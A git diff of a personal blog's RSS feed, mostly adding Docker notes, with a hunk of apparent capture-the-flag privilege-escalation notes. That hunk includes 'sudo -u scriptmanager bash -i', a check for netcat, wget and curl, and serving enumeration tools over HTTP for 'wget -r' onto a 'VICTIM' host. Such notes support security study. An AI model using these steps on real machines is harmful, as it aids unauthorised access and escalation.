@@ -1,5 +1,44 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0"><channel><title>Daniel Haggerty's Blog</title><link>/</link><description></description><lastBuildDate>Tue, 03 Nov 2020 00:00:00 -0600</lastBuildDate><item><title>"iphone"</title><link>/iphone.html</link><description></description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel Haggerty</dc:creator><pubDate>Tue, 03 Nov 2020 00:00:00 -0600</pubDate><guid isPermaLink="false">tag:None,2020-11-03:/iphone.html</guid><category>DFIR</category><category>iphone</category></item><item><title>"Docker Commands"</title><link>/docker-commands.html</link><description>&lt;h3&gt;Docker&lt;/h3&gt;
+<rss version="2.0"><channel><title>Digital Forensics</title><link>/</link><description></description><lastBuildDate>Tue, 03 Nov 2020 00:00:00 -0600</lastBuildDate><item><title>"Android Artifacts"</title><link>/android-artifacts.html</link><description></description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel Haggerty</dc:creator><pubDate>Tue, 03 Nov 2020 00:00:00 -0600</pubDate><guid isPermaLink="false">tag:None,2020-11-03:/android-artifacts.html</guid><category>Artifacts</category><category>Android</category></item><item><title>"Elasticsearch"</title><link>/elasticsearch.html</link><description></description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel Haggerty</dc:creator><pubDate>Tue, 03 Nov 2020 00:00:00 -0600</pubDate><guid isPermaLink="false">tag:None,2020-11-03:/elasticsearch.html</guid><category>Analysis</category><category>ELK</category></item><item><title>"iPhone Artifacts"</title><link>/iphone-artifacts.html</link><description></description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel Haggerty</dc:creator><pubDate>Tue, 03 Nov 2020 00:00:00 -0600</pubDate><guid isPermaLink="false">tag:None,2020-11-03:/iphone-artifacts.html</guid><category>Artifacts</category><category>iPhone</category><category>iOS</category></item><item><title>"Mac Artifacts"</title><link>/mac-artifacts.html</link><description></description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel Haggerty</dc:creator><pubDate>Tue, 03 Nov 2020 00:00:00 -0600</pubDate><guid isPermaLink="false">tag:None,2020-11-03:/mac-artifacts.html</guid><category>Artifacts</category><category>Mac</category><category>iOS</category></item><item><title>"Windows Artifacts"</title><link>/windows-artifacts.html</link><description></description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel Haggerty</dc:creator><pubDate>Tue, 03 Nov 2020 00:00:00 -0600</pubDate><guid isPermaLink="false">tag:None,2020-11-03:/windows-artifacts.html</guid><category>Artifacts</category><category>Windows</category></item><item><title>"Docker Certified Associate"</title><link>/docker-certified-associate.html</link><description>&lt;h3&gt;Docker&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run dans-container
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Is equivalent too&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker create dans-container
+docker start dans-container
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run busybox ping google.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;dockerfile&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;alpine&lt;/span&gt;
+
+&lt;span class="n"&gt;WORKDIR&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/app&amp;#39;&lt;/span&gt;
+
+&lt;span class="k"&gt;COPY&lt;/span&gt; &lt;span class="n"&gt;package&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;RUN&lt;/span&gt; &lt;span class="n"&gt;npm&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt;
+
+&lt;span class="k"&gt;COPY&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;CMD&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;npm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;docker-compose.yml&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;version: &amp;#39;3&amp;#39;&lt;/span&gt;
+&lt;span class="c"&gt;services:&lt;/span&gt;
+&lt;span class="c"&gt;  redis-server:&lt;/span&gt;
+&lt;span class="c"&gt;    image: &amp;#39;redis&amp;#39;&lt;/span&gt;
+&lt;span class="c"&gt;  node-app:&lt;/span&gt;
+&lt;span class="c"&gt;    restart: always&lt;/span&gt;
+&lt;span class="c"&gt;    build: .&lt;/span&gt;
+&lt;span class="c"&gt;    ports:&lt;/span&gt;
+&lt;span class="c"&gt;      - &amp;quot;4001:8081&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The commands are different if we have a docker-compose.yml.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel Haggerty</dc:creator><pubDate>Sat, 18 Jan 2020 00:00:00 -0600</pubDate><guid isPermaLink="false">tag:None,2020-01-18:/docker-certified-associate.html</guid><category>Docker</category><category>Docker</category></item><item><title>"Docker Commands"</title><link>/docker-commands.html</link><description>&lt;h3&gt;Docker&lt;/h3&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run dans-container
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
@@ -185,9 +224,11 @@ BY HAND
 6. ps aux | grep root == john mysql -u root
 7. If webserver poke around database
 8. Look at original nmap scan for other shite running (nmap localhost)&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;sudo -u anotheruser command run sommand as another user
-sudo -u scriptmanager bash -i #run shell as user scriptmanager
-which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;sudo -u anotheruser command run sommand as another user&lt;/span&gt;
+&lt;span class="err"&gt;sudo -u scriptmanager bash -i #run shell as user scriptmanager&lt;/span&gt;
+&lt;span class="err"&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&amp;gt;/dev/null&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 &lt;p&gt;DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
 python -m SimpleHTTPServer
 wget -r 10.10.14.7:8000
